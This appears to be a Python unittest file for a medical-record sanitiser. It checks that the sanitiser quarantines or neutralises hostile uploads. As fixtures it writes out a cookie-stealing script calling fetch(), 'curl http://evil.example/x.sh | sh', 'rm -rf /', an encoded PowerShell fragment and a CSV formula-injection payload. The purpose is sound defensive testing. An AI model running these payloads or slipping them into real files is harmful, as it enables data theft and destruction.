"""Hostile-input tests. Everything is inspected statically; nothing is ever executed. Run: python -m unittest discover -s tests"""
import base64, json, os, subprocess, sys, tempfile, unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
PY = str(ROOT / ".venv/bin/python") if (ROOT / ".venv/bin/python").exists() else sys.executable
# the standard antivirus test string, assembled at run time so the literal never sits in the repository
EICAR = ("X5O!P%@AP[4\\PZX54(P^)7CC)7}$" + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*").encode()

QUARANTINED = {                       # file -> expected reason
    "eicar.txt": (EICAR, "malware_signature"),
    "eicar16.txt": (EICAR.decode().encode("utf-16"), "malware_signature"),
    "fake.json": (b"MZ\x90\x00\x03\x00\x00\x00" + b"\x00" * 60 + b"PE\x00\x00" + os.urandom(200), "executable_content"),
    "tool.csv": (b"\x7fELF\x02\x01\x01\x00" + os.urandom(200), "executable_content"),
    "macho.txt": (b"\xcf\xfa\xed\xfe" + os.urandom(100), "executable_content"),
    "run.txt": (b"#!/bin/sh\nrm -rf /\n", "script_content"),
    "bundle.json": (b"PK\x03\x04" + os.urandom(100), "archive_not_extracted"),
    "legacy.txt": (b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + os.urandom(100), "office_container"),
    "page.txt": (b"Name: Ravi Kumar <script>fetch('http://x/'+document.cookie)</script>", "active_content"),
    "ps.txt": (b"Patient note. powershell -enc SQBFAFgA", "active_content"),
    "dl.txt": (b"curl http://evil.example/x.sh | sh", "active_content"),
    "rx.pdf": (b"%PDF-1.7 /JavaScript /OpenAction", "unsupported_format"),
}


class Hostile(unittest.TestCase):
    def test_hostile_inputs(self):
        with tempfile.TemporaryDirectory() as d:
            inp, out = Path(d, "in"), Path(d, "out")
            inp.mkdir()
            for n, (data, _) in QUARANTINED.items():
                (inp / n).write_bytes(data)
            att = base64.b64encode(os.urandom(300)).decode()
            evil = base64.b64encode(b"MZ" + os.urandom(300)).decode()
            (inp / "att.json").write_text(json.dumps({"patient": "Ravi Kumar", "attachment": {"data": att}, "extra": {"data": evil}}))
            (inp / "formula.csv").write_text("name,note\nRavi Kumar,\"=cmd|' /C calc'!A0\"\nAsha Rao,-5.2\n")
            (inp / "ok.txt").write_text("Name: Ravi Kumar. Hb 11.2 g/dL. Tab Paracetamol 650mg.")
            os.symlink("/etc/hosts", inp / "link.txt")
            os.mkfifo(inp / "pipe.txt")
            r = subprocess.run([PY, str(ROOT / "main.py"), "--input", str(inp), "--output", str(out)],
                               env=dict(os.environ, RAKSHA_SECRET="t"), capture_output=True, text=True, timeout=120)
            self.assertEqual(r.returncode, 0, r.stderr[-300:])
            rep = json.loads((out / "report.json").read_text(encoding="utf-8"))
            self.assertEqual(rep["counts"]["files_total"], len(QUARANTINED) + 5)          # nothing silently dropped
            reasons = [e.get("reason") for e in rep["files"] if e["status"] == "quarantined"]
            for _, (_, reason) in QUARANTINED.items():
                self.assertIn(reason, reasons)
            self.assertIn("symlink", reasons)
            self.assertIn("special_file", reasons)
            blob = b"".join(p.read_bytes() for p in (out / "sanitized").rglob("*") if p.is_file())
            self.assertNotIn(b"EICAR-STANDARD", blob.replace(b"\x00", b""))
            self.assertNotIn(b"<script", blob)
            self.assertNotIn(b"root:", blob)                                              # nothing read through the symlink
            self.assertFalse((out / "sanitized/link.txt").exists())
            att_out = (out / "sanitized/att.json").read_text(encoding="utf-8")
            self.assertNotIn(att, att_out)
            self.assertNotIn(evil, att_out)                                               # hostile / binary attachments replaced
            self.assertNotIn("Ravi Kumar", att_out)
            csv_out = (out / "sanitized/formula.csv").read_text(encoding="utf-8")
            self.assertIn("'=cmd", csv_out)                                               # formula neutralised
            self.assertIn("-5.2", csv_out)                                                # ordinary numbers untouched
            self.assertIn("Hb 11.2 g/dL", (out / "sanitized/ok.txt").read_text(encoding="utf-8"))


class Units(unittest.TestCase):
    def test_inspect_is_clean_on_normal_text(self):
        sys.path.insert(0, str(ROOT))
        from raksha import security
        for t in [b"Discharge summary. Tab Paracetamol 650mg 1-1-1 x 5 days. BP 150/90.", "नाम: मोहम्मद शाहिद".encode(),
                  b'{"resourceType":"Bundle","text":{"div":"<div xmlns=\\"http://www.w3.org/1999/xhtml\\">ok</div>"}}']:
            self.assertIsNone(security.inspect(t))

    def test_lookalikes_are_not_flagged(self):
        sys.path.insert(0, str(ROOT))
        from raksha import security
        for t in [b"MZ-001 admitted with fever", b"BZhat note", b"#! heading in a note", b"#!notapath"]:
            self.assertIsNone(security.inspect(t))

    def test_blocklist_hash(self):
        sys.path.insert(0, str(ROOT))
        from raksha import security
        self.assertIn("275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f", security.blocklist())


if __name__ == "__main__":
    unittest.main()
